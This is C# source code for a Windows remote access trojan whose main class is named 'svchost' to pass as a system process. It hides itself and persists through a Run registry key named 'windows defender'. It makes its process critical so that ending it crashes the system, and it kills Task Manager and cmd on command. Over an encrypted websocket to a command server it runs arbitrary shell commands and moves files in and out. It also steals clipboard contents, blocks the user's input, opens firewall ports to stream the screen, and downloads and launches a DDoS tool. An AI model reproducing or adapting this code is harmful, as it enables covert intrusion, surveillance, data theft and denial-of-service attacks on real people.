﻿using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;
using Newtonsoft.Json;
using System.Diagnostics;
using Microsoft.Win32;
using System.Net;
using System.Management;
using TextCopy;
using System.Drawing;
using WebSocketSharp;
using WebSocketSharp.Server;
using System.Collections.Concurrent;
using System.Drawing.Imaging;


class svchost
{
    public static bool runStartup = true;
    public static class ProcessProtection
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        private static volatile bool s_isProtected = false;
        private static ReaderWriterLockSlim s_isProtectedLock = new ReaderWriterLockSlim();

        public static bool IsProtected
        {
            get
            {
                try
                {
                    s_isProtectedLock.EnterReadLock();

                    return s_isProtected;
                }
                finally
                {
                    s_isProtectedLock.ExitReadLock();
                }
            }
        }

        public static void Protect()
        {
            try
            {
                s_isProtectedLock.EnterWriteLock();

                if (!s_isProtected)
                {
                    System.Diagnostics.Process.EnterDebugMode();
                    RtlSetProcessIsCritical(1, 0, 0);
                    s_isProtected = true;
                }
            }
            finally
            {
                s_isProtectedLock.ExitWriteLock();
            }
        }

        public static void Unprotect()
        {
            try
            {
                s_isProtectedLock.EnterWriteLock();

                if (s_isProtected)
                {
                    RtlSetProcessIsCritical(0, 0, 0);
                    s_isProtected = false;
                }
            }
            finally
            {
                s_isProtectedLock.ExitWriteLock();
            }
        }
    }

    class Crypt
    {
        private string key = "%Mq3t*&1T$C&F)JH";
        public string Encrypt(string plaintext)
        {
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            byte[] plaintextBytes = Encoding.UTF8.GetBytes(plaintext);
            byte[] iv = Encoding.UTF8.GetBytes("A+.8(SASD@#^DFAE");

            using (Aes aes = Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = keyBytes;
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

                byte[] ciphertext = encryptor.TransformFinalBlock(plaintextBytes, 0, plaintextBytes.Length);

                return Convert.ToBase64String(ciphertext);
            }
        }

        public string Decrypt(string encodedText)
        {
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            byte[] ciphertext = Convert.FromBase64String(encodedText);
            byte[] iv = Encoding.UTF8.GetBytes("A+.8(SASD@#^DFAE");

            using (Aes aes = Aes.Create())
            {
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = keyBytes;
                aes.IV = iv;

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                byte[] plaintextBytes = decryptor.TransformFinalBlock(ciphertext, 0, ciphertext.Length);

                return Encoding.UTF8.GetString(plaintextBytes);
            }
        }
    }
    public static string RunCommand(string command)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c "+command;
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.CreateNoWindow = true;

        Process p = new Process();
        p.StartInfo = psi;
        p.Start();

        string output = p.StandardOutput.ReadToEnd();
        string error = p.StandardError.ReadToEnd();

        p.WaitForExit();
        return error + output;
    }

    

    static void runOnstartup()
    {
        string name = Process.GetCurrentProcess().ProcessName + ".exe";
        string appName = "windows defender";
        string appPath = "C:\\Users\\Public\\Pictures\\" + name;

        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        try
        {
            // Add your program to the startup folder
            registryKey.SetValue(appName, appPath);
        }
        catch (Exception ex)
        {

        }
    }

    static void deleteOnstartup()
    {
        string name = Process.GetCurrentProcess().ProcessName + ".exe";
        string appName = "windows defender";
        string appPath = "C:\\Users\\Public\\Pictures\\" + name;

        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

        try
        {
            // Add your program to the startup folder
            registryKey.DeleteValue(appName, false);
        }
        catch (Exception ex)
        {

        }
    }


    public static string GetGPUName()
    {
        try
        {
            string gpuName = "Unknown";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController");

            foreach (ManagementObject obj in searcher.Get())
            {
                gpuName = obj["Name"].ToString();
                break; // Get the first GPU name and break out of the loop
            }

            return gpuName;
        }catch
        {
            return "None";
        }
        
    }
    public static string ExtractUserNames()
    {
        var wmiQuery = new SelectQuery("Win32_UserAccount");
        var searcher = new ManagementObjectSearcher(wmiQuery);
        var results = searcher.Get();

        var username = "";
        foreach (var result in results)
        {
            string us = result["Name"].ToString();
            if (us == "DefaultAccount" || us == "WDAGUtilityAccount" || us == "Guest")
            {

            }
            else
            {
                username += us + ", ";
            }
            
        }
        return username;
    }   



        public static string GetGPUMemorySize()
    {
        try
        {
            string gpuMemorySize = "Unknown";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT AdapterRAM FROM Win32_VideoController");

            foreach (ManagementObject obj in searcher.Get())
            {
                ulong ramBytes = (ulong)obj["AdapterRAM"];
                double ramMegabytes = ramBytes / 1024.0 / 1024.0;
                gpuMemorySize = $"{ramMegabytes:N2} MB";
                break; // Get the first GPU size and break out of the loop
            }

            return gpuMemorySize;
        }
        catch
        {
            return "None";
        }
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORYSTATUSEX
    {
        public uint dwLength;
        public uint dwMemoryLoad;
        public ulong ullTotalPhys;
        public ulong ullAvailPhys;
        public ulong ullTotalPageFile;
        public ulong ullAvailPageFile;
        public ulong ullTotalVirtual;
        public ulong ullAvailVirtual;
        public ulong ullAvailExtendedVirtual;
        public void Init()
        {
            dwLength = checked((uint)Marshal.SizeOf(typeof(MEMORYSTATUSEX)));
        }
    }

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX lpBuffer);
    public static string system_info()
    {
        dynamic data = new { };
        try
        {
            int cpuCount = 0;

            // cpu count
            try
            {
                cpuCount = Environment.ProcessorCount;
            }catch(Exception) { }
            
            // cpu usage
            
            float cpuUsage = 0;
            try
            {
                var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
                cpuUsage = cpuCounter.NextValue();
                Thread.Sleep(1000);
                cpuUsage = cpuCounter.NextValue();
            }catch(Exception) { }
            
            //cou model
            var cpumodel = "";
            try
            {
                var searcher = new ManagementObjectSearcher("select * from Win32_Processor");

                foreach (ManagementObject obj in searcher.Get())
                {
                    cpumodel = obj["Name"].ToString();
                    break;
                }
            }
            catch
            {

            }
            

            // ram usage
            double memoryUsedInGB = 0;

            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                long memoryUsed = currentProcess.WorkingSet64;
                memoryUsedInGB += (double)memoryUsed / 1073741824;
            }
            catch
            {

            }
            // ram slots 
            
            int slots = 0;
            try
            {
                ManagementObjectSearcher search = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemoryArray");
                foreach (ManagementObject obj in search.Get())
                {
                    slots += Convert.ToInt32(obj["MemoryDevices"]);
                }
            }
            catch
            {

            }
            
            // ram size
            
            string ram_size = "";
            try
            {
                MEMORYSTATUSEX memStatus = new MEMORYSTATUSEX();
                memStatus.Init();
                if (GlobalMemoryStatusEx(ref memStatus))
                {
                    double totalMemoryInGB = (double)memStatus.ullTotalPhys / 1073741824;
                    ram_size = string.Format("{0:N2} GB", totalMemoryInGB);
                }
                else
                {
                    Console.WriteLine("Failed to retrieve memory status.");
                }
            }
            catch
            {

            }
            
            OperatingSystem os = Environment.OSVersion;
            TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount);

            data = new
            {
                os = os.VersionString + os.Platform,
                cpu_usage = cpuUsage,
                cpu_count = cpuCount,
                cpu_model = cpumodel,
                ram_size = ram_size,
                ram_usage = memoryUsedInGB,
                ram_slot_count = slots,
                gpu_name = GetGPUName(),
                gpu_size = GetGPUMemorySize(),
                usernames = ExtractUserNames(),
                uptime = uptime.ToString(@"dd\.hh\:mm\:ss")
            };
        }
        catch (Exception ex) { Console.WriteLine(ex.Message + "\n\n" + ex.StackTrace); }
        return JsonConvert.SerializeObject(data);
    }

    static void HideWindow()
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

    }

    public static void downloadDDOS(string url)
    {
        string fileName = "C:\\Users\\Public\\Pictures\\run.exe";
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
        request.Method = "GET";
        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
        using (Stream responseStream = response.GetResponseStream())
        using (FileStream fileStream = new FileStream(fileName, FileMode.Create))
        {
            // Read the response information and write it to the file
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
            {
                fileStream.Write(buffer, 0, bytesRead);
            }
        }
        response.Dispose();
    }

    public static void RunDDos(string url , string thread, string time)
    {
        RunCommand("\"C:\\Users\\Public\\Pictures\\run.exe\" " + url + " " + thread + " " + time);
    }
    public static bool cmdKiller = false;
    public static bool tskKiller = false;

    static void runStart()
    {

        while (runStartup)
        {
            if (!ProcessProtection.IsProtected)
            {
                ProcessProtection.Protect();
            }
            runOnstartup();

            
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {

                if (tskKiller)
                {
                    if (process.ProcessName.ToLower().StartsWith("taskmgr"))
                    {
                        process.Kill();
                    }
                }
                if (cmdKiller)
                {
                    if (process.ProcessName.ToLower().StartsWith("cmd"))
                    {
                        process.Kill();
                    }

                    if (process.ProcessName.ToLower().StartsWith("conhost"))
                    {
                        process.Kill();
                    }
                }
            }
            
            

            Thread.Sleep(300);
        }
    }

    public static async Task websooo()
    {
        var webSocket = new ClientWebSocket();
        await webSocket.ConnectAsync(new Uri("wss://yourdomain.com"), default);
        Console.WriteLine("Connected");
        Crypt AES = new Crypt();
        // send connect
        dynamic tes222 = JsonConvert.DeserializeObject("{ \"action\" : \"start\" }");
        tes222["info"] = system_info();
        string jsonString22 = AES.Encrypt(JsonConvert.SerializeObject(tes222));
        byte[] messageBytes22 = Encoding.UTF8.GetBytes(jsonString22);
        await webSocket.SendAsync(new ArraySegment<byte>(messageBytes22), WebSocketMessageType.Text, true, default);
        // 
        byte[] buffer = new byte[10000000];
        while (true)
        {
            var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), default);
            if (result.MessageType == WebSocketMessageType.Text)
            {
                string receivedMessage = Encoding.UTF8.GetString(buffer, 0, result.Count);
                dynamic okdata = JsonConvert.DeserializeObject(AES.Decrypt(receivedMessage));
                if (okdata.action == "cmd")
                {
                    string datacmd = RunCommand(Convert.ToString(okdata.command));
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"cmd\" }");
                    tes["result"] = datacmd;
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);

                }
                else if (okdata.action == "getinfo")
                {

                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"getinfo\" }");
                    tes["info"] = system_info();
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);

                }else if (okdata.action == "download")
                {
                    using (var fileStream = new FileStream(Convert.ToString(okdata.path), FileMode.Open, FileAccess.Read, FileShare.Read))
                    {
                        var buffer3 = new byte[8192];
                        int bytesRead;

                        while ((bytesRead = fileStream.Read(buffer3, 0, buffer3.Length)) > 0)
                        {
                            byte[] data = new byte[bytesRead];
                            Array.Copy(buffer3, data, bytesRead);

                            await webSocket.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(
                                AES.Encrypt(JsonConvert.SerializeObject(new
                                {
                                    action = "savedownload",
                                    data = Convert.ToBase64String(data),
                                    path = Convert.ToString(okdata.path),
                                    user_id = Convert.ToString(okdata.user_id)
                                }))
                            )), WebSocketMessageType.Text, true, CancellationToken.None);
                        }

                        await webSocket.SendAsync(new ArraySegment<byte>(Encoding.UTF8.GetBytes(
                            AES.Encrypt(JsonConvert.SerializeObject(new
                            {
                                action = "enddownload",
                                path = Convert.ToString(okdata.path),
                                user_id = Convert.ToString(okdata.user_id)
                            }))
                        )), WebSocketMessageType.Text, true, CancellationToken.None); ;
                    }

                }else if (okdata.action == "upload")
                {
                    byte[] data = Convert.FromBase64String(Convert.ToString(okdata.data).ToString());
                    using (FileStream fileStream = new FileStream(Convert.ToString(okdata.path), FileMode.Append))
                    {
                        fileStream.Write(data, 0, data.Length);
                    }
                }else if (okdata.action == "lockinput")
                {
                    [DllImport("user32.dll", SetLastError = true)]
                    [return: MarshalAs(UnmanagedType.Bool)]
                    static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
                    BlockInput(true);

                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"lockinput\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }
                else if (okdata.action == "unlockinput")
                {
                    [DllImport("user32.dll", SetLastError = true)]
                    [return: MarshalAs(UnmanagedType.Bool)]
                    static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
                    BlockInput(false);

                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"unlockinput\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }else if (okdata.action == "ddos")
                {
                    downloadDDOS(Convert.ToString(okdata.url_download));
                    Thread ddosThread = new Thread(() => RunDDos(Convert.ToString(okdata.url), Convert.ToString(okdata.thread), Convert.ToString(okdata.time)));
                    ddosThread.Start();
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"ddos\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }else if (okdata.action == "selfdestroy")
                {
                    runStartup = false;
                    Thread.Sleep(1000);
                    deleteOnstartup();
                    ProcessProtection.Unprotect();
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"selfdestroy\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                    File.Delete("C:\\Users\\Public\\Pictures\\run.exe");
                    try
                    {
                        string name = Process.GetCurrentProcess().ProcessName + ".exe";
                        File.Delete("C:\\Users\\Public\\Pictures\\"+ name);
                    }
                    catch
                    {

                    }
                    Process.GetCurrentProcess().Kill();
                }else if (okdata.action == "getclipboard")
                {
                    string clipboardText = ClipboardService.GetText();
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"getclipboard\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    tes["data"] = clipboardText;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }
                else if (okdata.action == "setclipboard")
                {
                    ClipboardService.SetText(Convert.ToString(okdata.data));
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"setclipboard\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }else if (okdata.action == "tskmgrkillon")
                {
                    tskKiller = true;
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"tskmgrkillon\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }
                else if (okdata.action == "tskmgrkilloff")
                {
                    tskKiller = false;
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"tskmgrkilloff\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }
                else if (okdata.action == "cmdkillon")
                {
                    cmdKiller = true;
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"cmdkillon\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }
                else if (okdata.action == "cmdkilloff")
                {
                    cmdKiller = false;
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"cmdkilloff\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }else if (okdata.action == "streamviewon")
                {
                    runWebsocketVnc();
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"streamviewon\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }
                else if (okdata.action == "streamviewoff")
                {
                    stopWebsocketVnc();
                    dynamic tes = JsonConvert.DeserializeObject("{ \"action\" : \"streamviewoff\" }");
                    tes["user_id"] = okdata.user_id;
                    tes["msg_id"] = okdata.msg_id;
                    string jsonString = AES.Encrypt(JsonConvert.SerializeObject(tes));
                    byte[] messageBytes = Encoding.UTF8.GetBytes(jsonString);
                    await webSocket.SendAsync(new ArraySegment<byte>(messageBytes), WebSocketMessageType.Text, true, default);
                }


            }
            else if (result.MessageType == WebSocketMessageType.Close)
            {
                break;
            }
        }
        await webSocket.CloseAsync(WebSocketCloseStatus.NormalClosure, "", default);
    }


    static async Task Main(string[] args)
    {
        Console.SetWindowSize(1, 1);
        HideWindow();
        string name = Process.GetCurrentProcess().ProcessName + ".exe";
        RunCommand("copy " + name + " \"C:\\Users\\Public\\Pictures\\\"");
        RunCommand("attrib +h +a \"C:\\Users\\Public\\Pictures\\" + name + "\"");
        RunCommand("attrib +h +a \"" + name + "\"");
        ProcessProtection.Protect();
        Thread thread = new Thread(new ThreadStart(runStart));
        thread.Start();
        
        while (true)
        {
            try
            {
                await websooo();
                Thread.Sleep(1000);
            }
            catch
            {

            }
        }

    }



    public static WebSocketServer server;
    public static byte[] screenshotBytes;
    public static bool isRunVnc;
    public static void sendVnc()
    {
        PrintScreen test = new PrintScreen();
       
        byte[] screenshotBytes = test.CaptureScreen2();

        while (isRunVnc)
        {
            byte[] screenshotBytesNew = test.CaptureScreen2();
            if (!Convert.ToBase64String(screenshotBytesNew).Equals(Convert.ToBase64String(screenshotBytes)))
            {
                screenshotBytes = screenshotBytesNew;
                MyService.SendToAll(screenshotBytes);
            }

            Thread.Sleep(500);
        }

    }
    public static void runWebsocketVnc()
    {
        RunCommand("netsh advfirewall firewall add rule name = \"TCP Port 5000\" dir =in action = allow protocol = TCP localport = 5000 && netsh advfirewall firewall add rule name = \"TCP Port 5000\" dir = out action = allow protocol = TCP localport = 5000");
        server = new WebSocketServer(IPAddress.Any, 5000);
        server.AddWebSocketService<MyService>("/");
        server.Start();
        isRunVnc = true;
        Thread vncimage = new Thread(new ThreadStart(sendVnc));
        vncimage.Start();
    }

    public static void stopWebsocketVnc()
    {

        isRunVnc = false;
        Thread.Sleep(2000);
        server.Stop();

    }

    public class PrintScreen
    {
        /// <summary>
        /// Creates an Image object containing a screen shot of the entire desktop
        /// </summary>
        /// <returns></returns>
        /// 
        public byte[] CaptureScreen2()
        {
            byte[] bytes;
            using (MemoryStream ms = new MemoryStream())
            {
                CaptureWindow(User32.GetDesktopWindow()).Save(ms, ImageFormat.Jpeg);
                bytes = ms.ToArray();
            }
            return bytes;
        }
        public Image CaptureScreen()
        {
            return CaptureWindow(User32.GetDesktopWindow());
        }

        /// <summary>
        /// Creates an Image object containing a screen shot of a specific window
        /// </summary>
        /// <param name="handle">The handle to the window. (In windows forms, this is obtained by the Handle property)</param>
        /// <returns></returns>
        public Image CaptureWindow(IntPtr handle)
        {
            // get te hDC of the target window
            IntPtr hdcSrc = User32.GetWindowDC(handle);
            // get the size
            User32.RECT windowRect = new User32.RECT();
            User32.GetWindowRect(handle, ref windowRect);
            int width = windowRect.right - windowRect.left;
            int height = windowRect.bottom - windowRect.top;
            // create a device context we can copy to
            IntPtr hdcDest = GDI32.CreateCompatibleDC(hdcSrc);
            // create a bitmap we can copy it to,
            // using GetDeviceCaps to get the width/height
            IntPtr hBitmap = GDI32.CreateCompatibleBitmap(hdcSrc, width, height);
            // select the bitmap object
            IntPtr hOld = GDI32.SelectObject(hdcDest, hBitmap);
            // bitblt over
            GDI32.BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, GDI32.SRCCOPY);
            // restore selection
            GDI32.SelectObject(hdcDest, hOld);
            // clean up
            GDI32.DeleteDC(hdcDest);
            User32.ReleaseDC(handle, hdcSrc);

            // get a .NET image object for it
            Image img = Image.FromHbitmap(hBitmap);
            // free up the Bitmap object
            GDI32.DeleteObject(hBitmap);

            return img;
        }

        /// <summary>
        /// Captures a screen shot of a specific window, and saves it to a file
        /// </summary>
        /// <param name="handle"></param>
        /// <param name="filename"></param>
        /// <param name="format"></param>
        public void CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format)
        {
            Image img = CaptureWindow(handle);
            img.Save(filename, format);
        }

        /// <summary>
        /// Captures a screen shot of the entire desktop, and saves it to a file
        /// </summary>
        /// <param name="filename"></param>
        /// <param name="format"></param>
        public void CaptureScreenToFile(string filename, ImageFormat format)
        {
            Image img = CaptureScreen();
            img.Save(filename, format);
        }

        /// <summary>
        /// Helper class containing Gdi32 API functions
        /// </summary>
        private class GDI32
        {

            public const int SRCCOPY = 0x00CC0020; // BitBlt dwRop parameter

            [DllImport("gdi32.dll")]
            public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest,
                int nWidth, int nHeight, IntPtr hObjectSource,
                int nXSrc, int nYSrc, int dwRop);
            [DllImport("gdi32.dll")]
            public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth,
                int nHeight);
            [DllImport("gdi32.dll")]
            public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
            [DllImport("gdi32.dll")]
            public static extern bool DeleteDC(IntPtr hDC);
            [DllImport("gdi32.dll")]
            public static extern bool DeleteObject(IntPtr hObject);
            [DllImport("gdi32.dll")]
            public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);
        }

        /// <summary>
        /// Helper class containing User32 API functions
        /// </summary>
        private class User32
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct RECT
            {
                public int left;
                public int top;
                public int right;
                public int bottom;
            }

            [DllImport("user32.dll")]
            public static extern IntPtr GetDesktopWindow();
            [DllImport("user32.dll")]
            public static extern IntPtr GetWindowDC(IntPtr hWnd);
            [DllImport("user32.dll")]
            public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);
            [DllImport("user32.dll")]
            public static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);

        }
    }
        


    public class MyService : WebSocketBehavior
    {
        private static ConcurrentDictionary<int, MyService> _sessions = new ConcurrentDictionary<int, MyService>();
        private static int _nextSessionId = 0;

        private int _sessionId;

        public MyService()
        {
            _sessionId = Interlocked.Increment(ref _nextSessionId);
            _sessions[_sessionId] = this;
        }

        protected override void OnClose(CloseEventArgs e)
        {
            _sessions.TryRemove(_sessionId, out var _);
            base.OnClose(e);
        }

        public static void SendToAll(byte[] data)
        {
            foreach (var session in _sessions.Values)
            {
                session.Send(data);
            }
        }
    }

    //ProcessProtection.Protect();
    //Console.WriteLine("Process is now protected: " + ProcessProtection.IsProtected);

    // Wait for 5 seconds
    //Thread.Sleep(15000);

    //ProcessProtection.Unprotect();


}